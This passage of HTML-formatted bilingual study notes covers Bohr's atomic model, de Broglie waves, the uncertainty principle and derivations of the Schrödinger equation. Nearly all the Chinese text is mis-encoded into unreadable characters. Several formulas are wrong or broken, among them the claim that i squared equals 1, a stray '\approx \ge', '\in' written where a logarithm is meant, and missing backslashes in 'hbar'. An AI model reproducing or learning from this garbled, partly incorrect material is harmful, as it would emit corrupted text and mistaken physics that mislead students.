m^{-1}$</p><p><mark>Bohrâ€™s theory çš„æˆåŠŸä¹‹å¤„åœ¨äº</mark> å…¶è§£é‡Šäº†ä¸ºä»€ä¹ˆåŸå­ä¼šå‘å‡º line spectra, ä»¥åŠå‡†ç¡®é¢„æµ‹å‡ºäº†å‘å°„å…‰çº¿çš„æ³¢é•¿.</p><p>Bohr theory åŒæ—¶ <mark>è§£é‡Šäº†å¸æ”¶å…‰è°±</mark> : ç‰¹å®šæ³¢é•¿çš„å…‰å­æ’å‡»ç”µå­åä½¿å…¶ä»ä½èƒ½çº§åˆ°äº†é«˜èƒ½çº§ (ä¹Ÿå°±æ˜¯å¸æ”¶äº†èƒ½é‡, ä¹Ÿå°±æ˜¯å¸æ”¶å…‰è°±ä¸­ç‰¹å®šé¢‘ç‡å¤„å‡ºç°æš—çº¿çš„åŸå› )</p><p>å…¶ä¹Ÿè§£é‡Šäº†åŸå­çš„ç¨³å®šæ€§: å¤„äºåŸºæ€çš„ç”µå­ä¸ä¼šå› åˆ°è¾¾æ›´ä½çš„èƒ½çº§è€Œé‡Šæ”¾èƒ½é‡ (æ¯•ç«Ÿå·²ç»ä¸ºæœ€ä½äº†)</p><p>ä½†æ˜¯ Bohr theory åªè§£é‡Šäº†æ°¢åŸå­, è€Œæ²¡æœ‰è§£é‡Šå…¶ä»–åŸå­.</p><p>Bohr theory æ²¡æœ‰è§£é‡Šç”µå­æ˜¯æ€æ ·ä»ä¸€ä¸ªèƒ½çº§åˆ°è¾¾å¦ä¸€ä¸ªèƒ½çº§.</p><p>The Bohr model is only a model, not reality.</p><p>ç°ä»£çš„ç”µå­ are better thought of as forming â€œcloudsâ€. (ç”µå­äº‘)</p><h2 id="33-11-å¾·å¸ƒç½—æ„å¯¹åŸå­çš„å‡è®¾"><a href="#33-11-å¾·å¸ƒç½—æ„å¯¹åŸå­çš„å‡è®¾" class="headerlink" title="33.11 å¾·å¸ƒç½—æ„å¯¹åŸå­çš„å‡è®¾"></a>33.11 å¾·å¸ƒç½—æ„å¯¹åŸå­çš„å‡è®¾</h2><p>åœ¨ Bohr çš„ç†è®ºä¸­, ç”µå­æ˜¯åšåœ†å‘¨è¿åŠ¨, de Broglie ç”±æ­¤å‡è®¾ electron wave æ˜¯ <mark>circulaar standing wave</mark> å¦‚:</p><p><img src="/../img/circular_standing_wave.png"></p><p>(è¿™æ ·æ³¢æ‰ä¸ä¼šå› ç›¸æ¶ˆå¹²æ¶‰è€Œæ¶ˆå¤±)</p><p>æ­¤æ—¶æ³¢é•¿åœ†å½¢è½¨é“çš„å‘¨é•¿:</p><p>$$<br>\displaylines{2 \pi r_n &#x3D; n \lambda \ \ n &#x3D; 1,2,3,â€¦ \newline~ \newline<br>(Bohr theory ä¸­çš„è½¨é“åŠå¾„ä¸º r_n) \newline~ \newline<br>ç»“åˆ: \lambda &#x3D; \frac{h}{mv} \newline~ \newline<br>2 \pi r_n &#x3D; n \frac{h}{mv} \newline~ \newline<br>mvr_n &#x3D; \frac{nh}{2 \pi}}<br>$$</p><p>è¿™ä¹ŸåŒæ—¶ä¸º Bohrâ€™s quantum condition. </p><p>å¾ˆå¤šä¸œè¥¿ Bohr çš„ç†è®ºéƒ½æ— æ³•è§£é‡Š, è€Œè¿™äº›åœ¨ quantum mechanics ä¸­å¾—åˆ°äº†è§£å†³.</p><p>Bohr theory çš„ç¼ºé™·:</p><p><img src="/../img/limitation_of_Bohr_theory.png"></p><h1 id="Chapter-34-é‡å­åŠ›å­¦-Quantum-Mechanics"><a href="#Chapter-34-é‡å­åŠ›å­¦-Quantum-Mechanics" class="headerlink" title="Chapter 34 é‡å­åŠ›å­¦ Quantum Mechanics"></a>Chapter 34 é‡å­åŠ›å­¦ Quantum Mechanics</h1><h2 id="34-1-é‡å­åŠ›å­¦-â€“-ä¸€ä¸ªæ–°ç†è®º-Quantum-Mechanics-â€“-A-New-Theory"><a href="#34-1-é‡å­åŠ›å­¦-â€“-ä¸€ä¸ªæ–°ç†è®º-Quantum-Mechanics-â€“-A-New-Theory" class="headerlink" title="34.1 é‡å­åŠ›å­¦ â€“ ä¸€ä¸ªæ–°ç†è®º Quantum Mechanics â€“ A New Theory"></a>34.1 é‡å­åŠ›å­¦ â€“ ä¸€ä¸ªæ–°ç†è®º Quantum Mechanics â€“ A New Theory</h2><p><mark>é‡å­åŠ›å­¦</mark> å°†æ³¢ç²’äºŒè±¡æ€§ç»Ÿä¸€åˆ°äº†ä¸€ä¸ªç†è®ºä¸­.</p><p>é‡å­åŠ›å­¦ä¸»è¦ç”¨äºå¤„ç†å¾®è§‚ä¸–ç•Œçš„ç²’å­å’Œå…‰.</p><h2 id="34-2-æ³¢åŠ¨æ–¹ç¨‹åŠå…¶å«ä¹‰-åŒç¼å®éªŒ-The-Wave-Function-and-Its-Interpretation-the-Double-Slit-Experiment"><a href="#34-2-æ³¢åŠ¨æ–¹ç¨‹åŠå…¶å«ä¹‰-åŒç¼å®éªŒ-The-Wave-Function-and-Its-Interpretation-the-Double-Slit-Experiment" class="headerlink" title="34.2 æ³¢åŠ¨æ–¹ç¨‹åŠå…¶å«ä¹‰; åŒç¼å®éªŒ The Wave Function and Its Interpretation; the Double-Slit Experiment"></a>34.2 æ³¢åŠ¨æ–¹ç¨‹åŠå…¶å«ä¹‰; åŒç¼å®éªŒ The Wave Function and Its Interpretation; the Double-Slit Experiment</h2><p>æ³¢çš„é‡è¦æ€§è´¨æœ‰:</p><ul><li>æ³¢é•¿</li><li>é¢‘ç‡</li><li>æŒ¯å¹…</li></ul><p>æ³¢åŠ¨æ–¹ç¨‹çš„ç¬¦å·ä¸º $\psi$</p><p><mark>è–›å®šè°”æ³¢åŠ¨æ–¹ç¨‹ (Schrodinger wave equation)</mark> æ˜¯æè¿°éç›¸å¯¹è®ºç‰©è´¨ç²’å­çš„åŸºæœ¬æ–¹ç¨‹.</p><p>å¯¹äºä¸€ä¸ªç²’å­æ¥è¯´, æ³¢åŠ¨æ–¹ç¨‹ $psi$ æ„å‘³ç€</p><p>å…‰çº¿çš„èƒ½é‡å¯†åº¦æ­£æ¯”äºå•ä½ä½“ç§¯ä¸­å…‰å­çš„æ•°é‡ n (åŒæ ·æ­£æ¯”äº $E^2$, E ä¸ºç”µåœºå¼ºåº¦):</p><p>$$<br>\displaylines{n \propto E^2}<br>$$</p><p>è¿™é‡Œéœ€è¦ç†è§£, $E^2$ åœ¨è¿™é‡Œçš„ä½œç”¨å°±æ˜¯è¡¨æ˜åœ¨ä¸€ä¸ªå•ä½ä½“ç§¯ä¸­å…‰å­å‡ºç°çš„æ¦‚ç‡.</p><p>å¦‚æœ $dV$ è¡¨ç¤ºæ— ç©·å°çš„ä½“ç§¯, $E^2 dV$ å°±æ­£æ¯”äºåœ¨ä½“ç§¯ $dV$ ä¸­å‘ç°å…‰å­çš„æ¦‚ç‡.</p><p>å¦‚æœ $\psi$ æè¿°å¾ˆå¤šç”µå­, é‚£ä¹ˆ $\left\vert \psi \right\vert^2 dV$ ä¸æœŸå¾…å‡ºç°åœ¨ $dV$ ä¸­çš„ç”µå­çš„ä¸ªæ•°æˆæ­£æ¯”.</p><p>å¦‚æœ $\psi$ æè¿°ä¸€ä¸ªç”µå­, é‚£ä¹ˆ$\left\vert \psi \right\vert^2$ çš„è§£é‡Šä¸º: $\left\vert \psi \right\vert^2 dV$ è¡¨ç¤ºåœ¨ç»™å®šæ—¶é—´å’Œç©ºé—´ä¸‹, ä½“ç§¯ $dV$ ä¸­æ‰¾åˆ°ç”µå­çš„æ¦‚ç‡.</p><p>å› æ­¤, $\left\vert \psi \right\vert^2$ è¢«è§†ä¸ºæ¦‚ç‡å¯†åº¦æˆ–æ¦‚ç‡åˆ†å¸ƒ.</p><p><mark>å°†å…‰çº¿æ”¹ä¸ºç”µå­çš„åŒç¼å¹²æ¶‰å®éªŒ</mark>, ç”¨è§å…‰å±ååº”ç”µå­çš„æ’å‡» (åœ¨ç”µå­ç¢°æ’åä¼šå‘å…‰)</p><p>å‘å°„çš„ç”µå­æµ, ä¸€æ¬¡å‘å°„ä¸€ä¸ª. æ¯æ¬¡è®°å½•ä¸€ä¸ªå¿«ç…§, å°†å¿«ç…§å åŠ åœ¨ä¸€èµ·, ç»“æœå¦‚:</p><p><img src="/../img/flashes_of_double_slit_using_electron.png"></p><p>ä¸èƒ½é¢„æµ‹ç”µå­ä¼šæ’å‡»é‚£é‡Œ, å¯ä»¥é¢„æµ‹æ¦‚ç‡, å…¶ä¸ $\left\vert \psi \right\vert^2$ æˆæ­£æ¯”.</p><p>å°±å¥½åƒç”µå­åŒæ—¶ç©¿è¿‡å…‰æ …å¹¶å’Œè‡ªå·±å‘ç”Ÿäº†å¹²æ¶‰. è¿™æ—¶éœ€è¦æŠŠç”µå­è§†ä¸ºæ³¢, è¿™æ ·å®ƒå°±å¯ä»¥åŒæ—¶ç©¿è¿‡ä¸¤ä¸ªå…‰æ ….</p><p>ä¸»è¦è§‚ç‚¹:</p><ul><li>å¦‚æœå°†ç”µå­è§†ä¸ºæ³¢, $\psi$ ä»£è¡¨æ³¢çš„æŒ¯å¹…</li><li>å¦‚æœå°†ç”µå­è§†ä¸ºç²’å­, åˆ™ $\psi$ ä»£è¡¨æ¦‚ç‡</li></ul><p>$\left\vert \psi \right\vert^2$ åŒæ ·ä»£è¡¨åœ¨ç»™å®šä½ç½®, å•ä½ä½“ç§¯ä¸­å‘ç°ç”µå­çš„æ¦‚ç‡.</p><h2 id="34-3-æµ·æ£®å ¡æµ‹ä¸å‡†åŸç†-The-Heisenberg-Uncertainty-Principle"><a href="#34-3-æµ·æ£®å ¡æµ‹ä¸å‡†åŸç†-The-Heisenberg-Uncertainty-Principle" class="headerlink" title="34.3 æµ·æ£®å ¡æµ‹ä¸å‡†åŸç† The Heisenberg Uncertainty Principle"></a>34.3 æµ·æ£®å ¡æµ‹ä¸å‡†åŸç† The Heisenberg Uncertainty Principle</h2><p>ä¸ç®¡æµ‹é‡å·¥å…·æœ‰å¤šç²¾ç¡®, éƒ½ä¼šæœ‰è¯¯å·®. ä½†æ˜¯æ ¹æ®é‡å­åŠ›å­¦, ç²¾ç¡®çš„æµ‹é‡éƒ½æœ‰ä¸€ä¸ªé™åˆ¶. å…¶å¹¶ä¸æ˜¯æ¥è‡ªå™¨æ. å–å†³äºä¸¤ä¸ªå› ç´ : </p><ul><li>æ³¢ç²’äºŒè±¡æ€§</li><li>è¢«è§‚å¯Ÿç‰©ä½“å’Œè§‚å¯Ÿå™¨æä¸å¯é¿å…çš„æ¥è§¦</li></ul><p>åœ¨æ²¡æœ‰ä»»ä½•å¹²æ‰°çš„æƒ…å†µä¸‹æµ‹é‡ä¸€ä¸ªç‰©ä½“æ˜¯ä¸å¯èƒ½çš„. æ¯”å¦‚:</p><p>åœ¨å…‰ç…§ä¸‹è§‚å¯Ÿä¸€ä¸ªä¹’ä¹“çƒ, ä¸ºäº†èƒ½çœ‹åˆ°çƒ, è‡³å°‘ä¸€ä¸ªå…‰å­ä¼šä»ä¹’ä¹“çƒä¸Šæ•£å°„, åå°„çš„å…‰å­ä¼šè¿›å…¥ä½ çš„çœ¼ç›æˆ–å…¶ä»–å™¨æ.</p><p>å…‰å­è‹¥è½åœ¨ç”µå­ä¸Š, å°±ä¼šæå¤§æ”¹å˜å…¶è¿åŠ¨.</p><p>è§‚å¯Ÿç‰©ä½“çš„ç²¾ç¡®åº¦, æœ€é«˜ä¸ºæ‰€ç”¨è¾å°„çš„æ³¢é•¿, æ³¢é•¿è¶Šå°, ç²¾ç¡®åº¦è¶Šé«˜, ä½†è¿™æ„å‘³ç€æ³¢çš„åŠ¨é‡è¶Šå¤§ ( $p &#x3D; \frac{h}{\lambda}$), ä¹Ÿå°±æ˜¯è¯´ç‰©ä½“å—åˆ°çš„æ’å‡»å°±æ›´å¼ºçƒˆ, ä½†ä½¿ç”¨æ³¢é•¿é•¿çš„æ³¢, ç²¾ç¡®åº¦åˆä¼šä¸‹é™.</p><p>å› æ­¤, è§‚å¯Ÿç‰©ä½“çš„è¡Œä¸ºåœ¨ç”µå­çš„ä½ç½®å’ŒåŠ¨é‡ä¸Šåˆ›é€ å‡ºäº†é‡è¦çš„è¯¯å·®, è¿™å°±æ˜¯ <mark>æµ‹ä¸å‡†åŸç†çš„æœ¬è´¨</mark>, ä¸”ç”± Heisenberg é¦–æ¬¡é˜è¿°.</p><p>ä½¿ç”¨æ³¢é•¿ä¸º $\lambda$ çš„æ³¢è¿›è¡Œæµ‹é‡çš„æœ€å¤§è¯¯å·®ä¸ºæ³¢é•¿æœ¬èº«, å³:</p><p>$$<br>\displaylines{\Delta x \approx \lambda}<br>$$</p><p>å‡è®¾ç”¨ä¸€ä¸ªå…‰å­å°±èƒ½è§‚å¯Ÿç‰©ä½“, å…‰å­çš„åŠ¨é‡ä¸º $p &#x3D; \frac{h}{\lambda}$, ä¸”ç¢°æ’æ—¶ä¼ é€’å…¨éƒ¨åŠ¨é‡, åˆ™:</p><p>$$<br>\displaylines{\Delta p \approx \frac{h}{\lambda}}<br>$$</p><p>å› æ­¤æœ‰:<br>$$<br>\displaylines{(\Delta x) (\Delta p) \approx h}<br>$$</p><p>ç”±äºè¯¯å·®å¯èƒ½æ›´å¤§ (æ›´å¤šçš„å…‰å­), å› æ­¤, ç»è¿‡ Heisenberg çš„è®¡ç®—, æœ€ä½³çš„ä¸º:<br>$$<br>\displaylines{(\Delta x) (\Delta p_x) \ge \frac{h}{2 \pi}}<br>$$<br>( $\Delta p_x$ æ˜¯xè½´æ–¹å‘ä¸Šçš„è¯¯å·®)</p><p>è¿™ä¸ªè¡¨è¾¾å¼ä¹Ÿæ˜¯ <mark>æµ·æ£®å ¡æµ‹ä¸å‡†åŸç†çš„æ•°å­¦è¡¨è¾¾</mark>, æˆ–è€…å«ä¸ç¡®å®šåŸç†. </p><p>å…¶è¯´æ˜ä¸èƒ½åŒæ—¶ç²¾ç¡®çš„æµ‹é‡ç‰©ä½“çš„ä½ç½®å’ŒåŠ¨é‡. å¦‚æœè¦ç²¾ç¡®æµ‹é‡ä½ç½®, $\Delta x$ ä¼šå¾ˆå°, ä½†æ˜¯ $\Delta p_x$ ä¼šå˜å¾—å¾ˆå¤§, åä¹‹. (åœ¨åŠ¨é‡æ”¹å˜åç‰©ä½“çš„ä¸‹ä¸€ä¸ªä½ç½®å°±æœªçŸ¥äº†)</p><p><mark>æµ·æ£®å ¡æµ‹ä¸å‡†åŸç†å…³äºæ—¶é—´å’Œèƒ½é‡çš„å½¢å¼</mark>:</p><p>ç”¨äºæµ‹é‡ç‰©ä½“çš„å…‰å­éœ€è¦ä¸€æ®µæ—¶é—´æ‰èƒ½æŠµè¾¾ç‰©ä½“, è€Œè¿™æ®µæ—¶é—´äº§ç”Ÿçš„è¯¯å·®å°±æ˜¯ä¹‹å‰çš„ $\Delta x$, æœ‰ $\Delta t \approx \Delta x &#x2F; c \approx \lambda &#x2F; c$, å› æ­¤:</p><p>$$<br>\displaylines{\Delta t \approx \frac{\lambda}{c}}<br>$$</p><p>å…‰å­å°†å…¨éƒ¨èƒ½é‡ä¼ é€’ç»™ç‰©ä½“:</p><p>$$<br>\displaylines{E &#x3D; hf &#x3D; h \frac{c}{\lambda}}<br>$$</p><p>å› æ­¤æœ‰:</p><p>$$<br>\displaylines{(\Delta E) (\Delta t) \approx h}<br>$$</p><p>æœ€ç»ˆå…³ç³»å¼, ç»æµ·æ£®å ¡ä»”ç»†è®¡ç®—ä¸º:<br>$$<br>\displaylines{(\Delta E) (\Delta t) \approx \ge \frac{h}{2 \pi}}<br>$$</p><p>ç”±äº $\frac{h}{2 \pi}$ è¿™ä¸ªé‡ç»å¸¸ä½¿ç”¨, å…¶è¢«åˆ†é…ä¸€ä¸ªç¬¦å· $\hbar$ (â€œh-barâ€):</p><p>$\hbar &#x3D; \frac{h}{2 \pi} &#x3D; \frac{6.626 \times 10^{-34} J \cdot s}{2 \pi} &#x3D; 1.055 \times 10^{-34} J \cdot s$</p><h2 id="34-4-å“²å­¦æ„ä¹‰-æ¦‚ç‡-VS-ç¡®å®šæ€§-Philosophic-Implications-Probability-Versus-Determinism"><a href="#34-4-å“²å­¦æ„ä¹‰-æ¦‚ç‡-VS-ç¡®å®šæ€§-Philosophic-Implications-Probability-Versus-Determinism" class="headerlink" title="34.4 å“²å­¦æ„ä¹‰; æ¦‚ç‡ VS ç¡®å®šæ€§ Philosophic Implications; Probability Versus Determinism"></a>34.4 å“²å­¦æ„ä¹‰; æ¦‚ç‡ VS ç¡®å®šæ€§ Philosophic Implications; Probability Versus Determinism</h2><p>ç»å…¸ç‰›é¡¿å­¦è¯´è®¤ä¸ºä¸–ç•Œæ˜¯ç¡®å®šçš„. åŸºæœ¬è§‚ç‚¹ä¸º, ä¸€ä¸ªç‰©ä½“åœ¨ç‰¹å®šæ—¶é—´çš„ä½ç½®å’Œé€Ÿåº¦æ˜¯å·²çŸ¥çš„. å¦‚æœæ–½åŠ åœ¨å…¶ä¸Šçš„ä½œç”¨åŠ›å·²çŸ¥, å…¶æœªæ¥çš„ä½ç½®å¯ä»¥é¢„æµ‹.</p><p>è€Œé‡å­åŠ›å­¦è®¤ä¸º, ç‰©ä½“çš„é€Ÿåº¦å’Œä½ç½®ä¸èƒ½åŒæ—¶ç²¾ç¡®å¾—çŸ¥.</p><p>ç”±äºç‰©è´¨éƒ½æ˜¯ç”±åŸå­æ„æˆ, æ­£å¸¸çš„ç‰©ä½“ä¹Ÿå¯ä»¥ç”¨æ¦‚ç‡è¡¨ç¤º, è€Œä¸æ˜¯ä¸¥æ ¼çš„ç¡®å®š. é‡å­åŠ›å­¦é¢„æµ‹ä¸­, å¾ˆå¤§æ¦‚ç‡æ™®é€šç‰©ä½“ä¼šè¡¨ç°å¾—åƒç»å…¸å®šå¾‹çš„é¢„æµ‹, å› ä¸ºæ­¤æ—¶ <mark>åŒ…å«äº†å¤§é‡çš„åˆ†å­</mark>, æ­¤æ—¶å¹³å‡ä¸‹æ¥, å‘ç”Ÿåå·®çš„æ•°é‡è¶‹è¿‘äº0. </p><p>é‡å­åŠ›å­¦ä¸­çš„æ¦‚ç‡æ˜¯è‡ªç„¶ç•Œä¸­å›ºæœ‰çš„.</p><p>æ¥å—é‡å­åŠ›å­¦å¯¹è‡ªç„¶ç•Œçš„è§‚ç‚¹è¢«ç§°ä¸º <mark>é‡å­åŠ›å­¦çš„å“¥æœ¬å“ˆæ ¹è§£é‡Š (Copenhagen interpretation)</mark> </p><p>Bohr è®¤ä¸º, åœ¨æ—¶é—´-ç©ºé—´ä¸Šæè¿°åŸå­å’Œç”µå­çš„å®é™…è¿åŠ¨æ˜¯ä¸å¯èƒ½çš„.</p><h2 id="34-5-ä¸€é˜¶è–›å®šè°”æ–¹ç¨‹-â€“-æ—¶é—´æ— å…³å½¢å¼-The-Schrodinger-Equation-in-One-Dimension-â€“-Time-Independent-Form"><a href="#34-5-ä¸€é˜¶è–›å®šè°”æ–¹ç¨‹-â€“-æ—¶é—´æ— å…³å½¢å¼-The-Schrodinger-Equation-in-One-Dimension-â€“-Time-Independent-Form" class="headerlink" title="34-5 ä¸€é˜¶è–›å®šè°”æ–¹ç¨‹ â€“ æ—¶é—´æ— å…³å½¢å¼ The Schrodinger Equation in One Dimension â€“ Time Independent Form"></a>34-5 ä¸€é˜¶è–›å®šè°”æ–¹ç¨‹ â€“ æ—¶é—´æ— å…³å½¢å¼ The Schrodinger Equation in One Dimension â€“ Time Independent Form</h2><p>æè¿° $\psi$ çš„åŸºæœ¬æ–¹ç¨‹å°±æ˜¯ <mark>Schrodinger equation</mark> .</p><p>è®°ä½ä¸€ä¸ªäº‹å®, è¿™é‡Œå¹¶æ²¡æœ‰æ¨å¯¼å‡ºè–›å®šè°”å…¬å¼, å…¶åªæ˜¯ä¸€ç§é‡å­åŠ›å­¦çš„è§£ææ–¹æ³•. è¿™é‡Œçš„å¼å­ä¸è¿‡æ˜¯ç¬¦åˆå¤§é‡çš„å®éªŒæƒ…å†µ. ä¸”å¼ºåŠ äº†å¾ˆå¤šç‰©ç†æ„ä¹‰.</p><p>è–›å®šè°”æ–¹ç¨‹èƒ½å†™æˆä¸¤ç§å½¢å¼:</p><ul><li>æ—¶é—´ç›¸å…³ç‰ˆæœ¬</li><li>æ—¶é—´æ— å…³ç‰ˆæœ¬</li></ul><blockquote><p>æ—¶é—´æ— å…³ç‰ˆæœ¬</p></blockquote><p>å…¶ä¸ºç¨³å®šçŠ¶æ€. æ­¤æ—¶çš„æ³¢åŠ¨å‡½æ•°åªåŒ…æ‹¬ç©ºé—´ä¾èµ–. å…¶ç”¨å°å†™çš„ Î¨ (psi) è¡¨ç¤ºä¸º: $\psi (x)$</p><p>ç»å…¸åŠ›å­¦ä¸­, è§£å†³é—®é¢˜çš„ä¸¤ä¸ªæ–¹æ³•:</p><ul><li>åŠ›çš„æ¦‚å¿µå’Œç‰›é¡¿å…¬å¼</li><li>èƒ½é‡çš„æ¦‚å¿µå’Œå®ˆæ’å…¬å¼</li></ul><p>è–›å®šè°”æ–¹ç¨‹æ˜¯åŸºäºèƒ½é‡çš„æ–¹æ³•.</p><p>æè¿°ä¸€ä¸ªç²’å­çš„æ³¢ (å¦‚, ç”µå­), å…¶å¾®åˆ†æ–¹ç¨‹å’Œç»å…¸çš„æ³¢çš„æ–¹ç¨‹ç±»ä¼¼, æœºæ¢°æ³¢å’Œç”µç£æ³¢çš„æ³¢çš„æ–¹ç¨‹å¦‚ $A \sin (kx - \omega t)$, $\sin\ å’Œ\ \cos$ å åŠ çš„å½¢å¼ä¸º: $A\sin (kx - \omega t) + B\cos (kx - \omega t)$, ç”±äºè¿™é‡Œåªä¸ç©ºé—´ç›¸å…³, åˆ™æœ‰ $t&#x3D;0$, æœ‰:<br>$$<br>\displaylines{\psi (x) &#x3D; A\sin kx + B\cos kx}<br>$$</p><p>(è¿™é‡Œ A å’Œ B æ˜¯å¸¸é‡, $k &#x3D; \frac{2 \pi}{\lambda}$)</p><p>å¯¹äºä¸€ä¸ªè´¨é‡ä¸º $m$, é€Ÿåº¦ä¸º $v$ çš„ç²’å­åº”ç”¨å¾·å¸ƒç½—æ„æ³¢é•¿å…¬å¼:<br>$$<br>\displaylines{k &#x3D; \frac{2 \pi}{\lambda}, \ \lambda &#x3D; \frac{h}{p} \newline~ \newline<br>k &#x3D; \frac{2 \pi p}{h} &#x3D; \frac{p}{\hbar}}<br>$$</p><p>åˆ©ç”¨èƒ½é‡å®ˆæ’å®šå¾‹:<br>$$<br>\displaylines{ \frac{p^2}{2m} + U &#x3D; E \newline~ \newline<br>(è¿™é‡Œå°±æ˜¯åŠ¨èƒ½åŠ åŠ¿èƒ½ç­‰äºæ€»èƒ½é‡) \newline~ \newline<br>\frac{\hbar^2 k^2 }{2m} + U &#x3D; E \newline~ \newline<br>(ç”¨ä¸Šè¿°å…¬å¼å°† p æ›¿æ¢æ‰)}<br>$$</p><p>æ±‚ $\psi(x)$ çš„ä¸¤æ¬¡å¾®åˆ†:<br>$$<br>\displaylines{ \frac{d\psi (x)}{dx} &#x3D; \frac{d}{dx}(A\sin kx + B\cos kx) &#x3D; k(A\cos kx - B\sin kx) \newline~ \newline<br>\frac{d^2 \psi (x)}{dx^2} &#x3D; k \frac{d}{dx}(A\cos kx - B\sin kx) &#x3D; -k^2 (A\sin kx + B\cos kx) &#x3D; -k^2 \psi(x) \newline~ \newline<br>ä¸¤è¾¹åŒæ—¶ä¹˜ä»¥\ \frac{-\hbar^2}{2m} \newline~ \newline</p><ul><li>\frac{\hbar^2}{2m} \frac{d^2\psi (x)}{dx^2} &#x3D; \frac{\hbar^2 k^2}{2m} \psi (x) \newline~ \newline<br>ç»“åˆ:\ \frac{p^2}{2m} + U &#x3D; E \newline~ \newline</li><li>\frac{\hbar^2}{2m} \frac{d^2 \psi (x)}{dx^2} + U(x) \psi (x) &#x3D; E \psi (x)}<br>$$<br>è¿™å°±æ˜¯ <mark>one0dimensional time-independent Schrodinger equation</mark>. (è¿™é‡Œçš„ä¸€ç»´, å°±æ˜¯æŒ‡è¿™é‡Œåªè€ƒè™‘äº† x è½´çš„æƒ…å†µ)</li></ul><p>è¿™é‡ŒåŒæ ·æœ‰:<br>$$<br>\displaylines{ \left\vert \psi \right\vert^2 dV}<br>$$<br>è¡¨ç¤ºåœ¨ä½“ç§¯ $dV$ ä¸­æ‰¾åˆ°ä¸€ä¸ªç²’å­çš„æ¦‚ç‡, è¿™é‡Œç”±äºæ˜¯ä¸€ç»´, å› æ­¤ $dV &#x3D; dx$, æ¦‚ç‡ä¹‹å’Œä¸º:</p><p>$$<br>\displaylines{\int_{all\ spaces} \left\vert \psi \right\vert^2 dV &#x3D; \int \left\vert \psi \right\vert^2 dx &#x3D; 1}<br>$$</p><p>è¿™è¢«å«åš <mark>normalization condition</mark> .</p><h2 id="34-6-æ—¶é—´ç›¸å…³çš„è–›å®šè°”æ–¹ç¨‹-Time-Dependent-Schrodinger-Eequation"><a href="#34-6-æ—¶é—´ç›¸å…³çš„è–›å®šè°”æ–¹ç¨‹-Time-Dependent-Schrodinger-Eequation" class="headerlink" title="34.6 æ—¶é—´ç›¸å…³çš„è–›å®šè°”æ–¹ç¨‹ Time-Dependent Schrodinger Eequation"></a>34.6 æ—¶é—´ç›¸å…³çš„è–›å®šè°”æ–¹ç¨‹ Time-Dependent Schrodinger Eequation</h2><p><mark>time-dependent Schrodinger equation</mark>, å…¬å¼ä¸º:</p><p>$$<br>\displaylines{- \frac{hbar^2}{2m} \frac{\partial^2 \Psi (x,t)}{\partial x^2} + U(x) \Psi(x,t) &#x3D; i\hbar \frac{\partial \Psi (x,t)}{\partial t}}<br>$$<br>(è¿™é‡Œçš„ $i&#x3D;\sqrt{-1}$, ä¸ºå¤æ•°, ä¸”æ­¤å¤„åŒæ ·æ˜¯ä¸€ç»´çš„)</p><blockquote><p>ç”¨æ—¶é—´ç›¸å…³è–›å®šè°”æ–¹ç¨‹å¾—åˆ°æ—¶é—´ä¸ç›¸å…³è–›å®šè°”æ–¹ç¨‹</p></blockquote><p>$$<br>\displaylines{\Psi (x,t) &#x3D; \psi (x) f(t) \newline~ \newline<br>å°†å…¶å¸¦å…¥ä¸Šå¼å¾—: \newline~ \newline</p><ul><li>\frac{hbar^2}{2m} f(t) \frac{\partial^2 \psi (x)}{\partial x^2} + U(x) \psi(x) f(t) &#x3D; i\hbar \psi (x) \frac{\partial f(t)}{\partial t} \newline~ \newline<br>ä¸¤è¾¹åŒæ—¶é™¤ä»¥ \psi (x) f(t) å¾—: \newline~ \newline</li><li>\frac{hbar^2}{2m} \frac{1}{\psi (x)} \frac{\partial^2 \psi (x)}{\partial x^2} + U(x) &#x3D; i\hbar \frac{1}{f(t)} \frac{\partial f(t)}{\partial t}}<br>$$<br>æ­¤æ—¶, æ–¹ç¨‹çš„å·¦è¾¹åªæœ‰ x, æ–¹ç¨‹çš„å³è¾¹åªæœ‰ t. å½“å·¦å³ä¸¤è¾¹éƒ½ç­‰äºä¸€ä¸ªå¸¸é‡æ—¶, ä¸¤è¾¹ç›¸ç­‰, å³:</li></ul><p>$$<br>\displaylines{\frac{hbar^2}{2m} \frac{1}{\psi (x)} \frac{\partial^2 \psi (x)}{\partial x^2} + U(x) &#x3D; C \newline~ \newline<br>i\hbar \frac{1}{f(t)} \frac{\partial f(t)}{\partial t} &#x3D; C}<br>$$</p><p>ä¸Šå¼ä¸¤è¾¹åŒæ—¶ä¹˜ä»¥ $\psi (x)$ å°±å˜æˆäº†è–›å®šè°”çš„æ—¶é—´æ— å…³å½¢å¼ (æ­¤æ—¶çš„ C çš„å€¼ç­‰äº E):<br>$$<br>\displaylines{\frac{\hbar^2}{2m} \frac{d^2 \psi (x)}{dx^2} + U(x) \psi (x) &#x3D; C \psi (x)}<br>$$</p><p>å› æ­¤ä¸‹å¼ä¸­çš„ $C &#x3D; E$, æœ‰:</p><p>$$<br>\displaylines{ \frac{df(t)}{dt} &#x3D; -i \frac{E}{hbar} dt \newline~ \newline<br>\frac{df(t)}{f(t)} &#x3D; -i \frac{E}{\hbar}dt \newline~ \newline<br>\in f(t) &#x3D; -i \frac{E}{\hbar} t \newline~ \newline<br>f(t) &#x3D; e^{-i ( \frac{E}{\hbar})t}}<br>$$</p><p>å› æ­¤:<br>$$<br>\displaylines{\Psi (x,t) &#x3D; \psi (x) f(t) \newline~ \newline<br>&#x3D; \psi (x) e^{-i ( \frac{E}{\hbar})t}}<br>$$</p><p>ç”±äº $\Psi$ ä¸­åŒ…å« $i &#x3D; \sqrt{-1}$, å…¶æ— æ³•ç›´æ¥ç‰©ç†æµ‹é‡, ä½† $i^2 &#x3D; 1$, å› æ­¤ $ \left\vert \Psi \right\vert^2$ å¯ä»¥ç‰©ç†æµ‹é‡,</p><p>ç”±äº:</p><p>$$<br>\displaylines{ \left\vert f(t) \right\vert &#x3D; \left\vert e^{-i (\frac{E}{\hbar}) t} \right\vert \newline~ \newline<br>e^{-i \theta &#x3D; \cos \theta - i\sin \theta} \newline~ \newline<br>\left\vert f(t) \right\vert &#x3D; 1 \newline~ \newline<br>\therefore \left\vert \Psi (x,t) \right\vert^2 &#x3D; \left\vert \psi (x) \right\vert^2}<br>$$</p><h2 id="34-7-è‡ªç”±ç²’å­-å¹³é¢æ³¢å’Œæ³¢åŒ…-Free-Particles-Plane-Waves-and-Wave-Packets"><a href="#34-7-è‡ªç”±ç²’å­-å¹³é¢æ³¢å’Œæ³¢åŒ…-Free-Particles-Plane-Waves-and-Wave-Packets" class="headerlink" title="34.7 è‡ªç”±ç²’å­; å¹³é¢æ³¢å’Œæ³¢åŒ… Free Particles; Plane Waves and Wave Packets"></a>34.7 